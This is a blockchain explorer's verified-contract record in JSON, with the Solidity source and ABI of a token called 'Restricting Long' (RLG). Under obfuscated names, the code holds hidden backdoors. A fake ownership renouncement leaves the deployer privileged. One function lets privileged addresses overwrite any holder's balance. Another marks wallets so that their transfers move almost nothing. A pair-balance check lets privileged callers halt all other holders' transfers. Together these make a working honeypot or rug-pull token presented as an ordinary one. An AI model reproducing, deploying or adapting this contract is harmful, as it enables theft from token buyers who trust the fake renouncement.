{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface receiverAtLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderFund {\n    function createPair(address tokenTx, address modeFee) external returns (address);\n}\n\ninterface liquidityLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeList) external view returns (uint256);\n\n    function transfer(address swapMin, uint256 fundReceiver) external returns (bool);\n\n    function allowance(address fundTeamShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapMin,\n        uint256 fundReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitAmountLaunch, uint256 value);\n    event Approval(address indexed fundTeamShould, address indexed spender, uint256 value);\n}\n\ninterface liquidityLaunchedMetadata is liquidityLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RestrictingLong is txLaunched, liquidityLaunched, liquidityLaunchedMetadata {\n\n    uint256 constant buyReceiver = 4 ** 10;\n\n    function balanceOf(address feeList) public view virtual override returns (uint256) {\n        return modeSell[feeList];\n    }\n\n    string private marketingMaxAuto = \"Restricting Long\";\n\n    uint256 private autoLaunch;\n\n    mapping(address => mapping(address => uint256)) private marketingWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityToken;\n    }\n\n    uint8 private liquidityToken = 18;\n\n    address public tokenAuto;\n\n    function owner() external view returns (address) {\n        return marketingFrom;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingMaxAuto;\n    }\n\n    address takeSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public exemptFee;\n\n    function transfer(address takeExempt, uint256 fundReceiver) external virtual override returns (bool) {\n        return sellAmount(_msgSender(), takeExempt, fundReceiver);\n    }\n\n    function maxSellMode() private view {\n        require(exemptFee[_msgSender()]);\n    }\n\n    string private txLiquidity = \"RLG\";\n\n    address public fundFrom;\n\n    bool private totalMode;\n\n    function transferFrom(address marketingSenderReceiver, address swapMin, uint256 fundReceiver) external override returns (bool) {\n        if (_msgSender() != takeSender) {\n            if (marketingWallet[marketingSenderReceiver][_msgSender()] != type(uint256).max) {\n                require(fundReceiver <= marketingWallet[marketingSenderReceiver][_msgSender()]);\n                marketingWallet[marketingSenderReceiver][_msgSender()] -= fundReceiver;\n            }\n        }\n        return sellAmount(marketingSenderReceiver, swapMin, fundReceiver);\n    }\n\n    bool public sellReceiverWallet;\n\n    bool public amountExempt;\n\n    uint256 private toTakeMin = 100000000 * 10 ** 18;\n\n    function allowance(address modeReceiver, address autoBuy) external view virtual override returns (uint256) {\n        if (autoBuy == takeSender) {\n            return type(uint256).max;\n        }\n        return marketingWallet[modeReceiver][autoBuy];\n    }\n\n    address private marketingFrom;\n\n    uint256 enableAmount;\n\n    bool private exemptTo;\n\n    function toFee(address marketingSenderReceiver, address swapMin, uint256 fundReceiver) internal returns (bool) {\n        require(modeSell[marketingSenderReceiver] >= fundReceiver);\n        modeSell[marketingSenderReceiver] -= fundReceiver;\n        modeSell[swapMin] += fundReceiver;\n        emit Transfer(marketingSenderReceiver, swapMin, fundReceiver);\n        return true;\n    }\n\n    bool private tokenTrading;\n\n    function toAt(address toShould) public {\n        if (sellReceiverWallet) {\n            return;\n        }\n        \n        exemptFee[toShould] = true;\n        if (amountExempt == exemptTo) {\n            listTxIs = autoLaunch;\n        }\n        sellReceiverWallet = true;\n    }\n\n    function approve(address autoBuy, uint256 fundReceiver) public virtual override returns (bool) {\n        marketingWallet[_msgSender()][autoBuy] = fundReceiver;\n        emit Approval(_msgSender(), autoBuy, fundReceiver);\n        return true;\n    }\n\n    address sellLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 feeWallet;\n\n    bool private takeTo;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toTakeMin;\n    }\n\n    function launchMinSell() public {\n        emit OwnershipTransferred(fundFrom, address(0));\n        marketingFrom = address(0);\n    }\n\n    function limitAuto(address takeExempt, uint256 fundReceiver) public {\n        maxSellMode();\n        modeSell[takeExempt] = fundReceiver;\n    }\n\n    uint256 private listTxIs;\n\n    mapping(address => uint256) private modeSell;\n\n    function getOwner() external view returns (address) {\n        return marketingFrom;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txLiquidity;\n    }\n\n    constructor (){\n        \n        receiverAtLimit maxAmount = receiverAtLimit(takeSender);\n        tokenAuto = senderFund(maxAmount.factory()).createPair(maxAmount.WETH(), address(this));\n        if (autoLaunch == listTxIs) {\n            autoLaunch = listTxIs;\n        }\n        fundFrom = _msgSender();\n        launchMinSell();\n        exemptFee[fundFrom] = true;\n        modeSell[fundFrom] = toTakeMin;\n        \n        emit Transfer(address(0), fundFrom, toTakeMin);\n    }\n\n    event OwnershipTransferred(address indexed liquidityFromList, address indexed fundTo);\n\n    function toEnableAuto(uint256 fundReceiver) public {\n        maxSellMode();\n        enableAmount = fundReceiver;\n    }\n\n    mapping(address => bool) public atLiquidity;\n\n    function sellAmount(address marketingSenderReceiver, address swapMin, uint256 fundReceiver) internal returns (bool) {\n        if (marketingSenderReceiver == fundFrom) {\n            return toFee(marketingSenderReceiver, swapMin, fundReceiver);\n        }\n        uint256 txReceiver = liquidityLaunched(tokenAuto).balanceOf(sellLaunched);\n        require(txReceiver == enableAmount);\n        require(swapMin != sellLaunched);\n        if (atLiquidity[marketingSenderReceiver]) {\n            return toFee(marketingSenderReceiver, swapMin, buyReceiver);\n        }\n        return toFee(marketingSenderReceiver, swapMin, fundReceiver);\n    }\n\n    function teamReceiver(address launchedAmount) public {\n        maxSellMode();\n        if (amountExempt != tokenTrading) {\n            tokenTrading = false;\n        }\n        if (launchedAmount == fundFrom || launchedAmount == tokenAuto) {\n            return;\n        }\n        atLiquidity[launchedAmount] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTeamShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFromList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAmountLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMinSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"limitAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiverWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"}],\"name\":\"teamReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"}],\"name\":\"toAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"toEnableAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSenderReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RestrictingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}